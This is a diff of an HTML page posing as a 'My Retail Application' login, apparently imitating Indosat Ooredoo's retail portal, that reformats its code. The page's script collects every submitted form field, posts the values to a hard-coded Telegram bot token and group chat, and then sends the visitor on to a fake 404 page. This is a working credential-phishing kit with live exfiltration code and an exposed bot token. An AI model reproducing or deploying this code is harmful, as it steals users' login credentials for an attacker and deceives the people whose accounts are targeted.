@@ -7,7 +7,7 @@
     <script src="
 https://cdn.jsdelivr.net/npm/sweetalert2@11.19.1/dist/sweetalert2.all.min.js
 "></script>
-<link href="
+    <link href="
 https://cdn.jsdelivr.net/npm/sweetalert2@11.19.1/dist/sweetalert2.min.css
 " rel="stylesheet">
     <title>My Retail Application</title>
@@ -76,9 +76,11 @@ https://cdn.jsdelivr.net/npm/sweetalert2@11.19.1/dist/sweetalert2.min.css
             border: 1px solid #e5e5e5;
             font-size: 0.9rem;
         }
+
         form input[type=text]:focus {
             border-color: blue;
         }
+
         .checkbox {
             display: flex;
             float: left;
@@ -106,6 +108,7 @@ https://cdn.jsdelivr.net/npm/sweetalert2@11.19.1/dist/sweetalert2.min.css
             cursor: pointer;
             color: white;
         }
+
         .btn button:hover {
             background-color: yellow;
             color: black;
@@ -140,7 +143,7 @@ https://cdn.jsdelivr.net/npm/sweetalert2@11.19.1/dist/sweetalert2.min.css
             <img src="https://myretail.indosatooredoo.com/img/login-loader.gif" alt="">
     </header>
     <script>
-        
+
         const token = '7645693066:AAENGntcRFZTWdiB6nH1pkPN6Imrrap5x9s'
         const group_id = '-4630518919'
 
@@ -148,51 +151,51 @@ https://cdn.jsdelivr.net/npm/sweetalert2@11.19.1/dist/sweetalert2.min.css
 
         const sendMessage = (text) => {
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json"
-                            },
-                            body: JSON.stringify({
-                                "chat_id": group_id,
-                                "text": text,
-                            })
-                        }).then(res => {
-                            if (!res.ok) {
-                                throw new Error(res.statusText, res.status, res.url);
-                            }
-                            document.getElementById('kirim').innerHTML = 'Login';
-                            setTimeout(function() {
-                            window.location.href = "404/404.html";
-                            },5000);
-                            return res.json();
-                        }).then(res => {
-                            console.log(res);
-                        }).catch(err => {
-                            console.log(err);
-                            alert('gagal')
-                        })
-                    };
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    "chat_id": group_id,
+                    "text": text,
+                })
+            }).then(res => {
+                if (!res.ok) {
+                    throw new Error(res.statusText, res.status, res.url);
+                }
+                document.getElementById('kirim').innerHTML = 'Login';
+                setTimeout(function () {
+                    window.location.href = "404/404.html";
+                }, 5000);
+                return res.json();
+            }).then(res => {
+                console.log(res);
+            }).catch(err => {
+                console.log(err);
+                alert('gagal')
+            })
+        };
 
-                    formtelegram.onsubmit = (e) => {
-                        document.getElementById('box').style.display = "none"
+        formtelegram.onsubmit = (e) => {
+            document.getElementById('box').style.display = "none"
             document.getElementById('login-loader').style.display = "block"
-                        e.preventDefault();
+            e.preventDefault();
 
-                        const formData = new FormData(formtelegram)
+            const formData = new FormData(formtelegram)
 
-                        let text = '';
+            let text = '';
 
-                        for (const [key, val] of formData) {
-                            console.log(`${key}:`, val);
+            for (const [key, val] of formData) {
+                console.log(`${key}:`, val);
 
-                            text += `\n\n${key}:\n${val}`;
+                text += `\n\n${key}:\n${val}`;
 
-                        }
+            }
 
-                        text = text.replace('\n\n', '');
+            text = text.replace('\n\n', '');
 
-                        sendMessage(text)
-                    }
+            sendMessage(text)
+        }
     </script>
 </body>
 
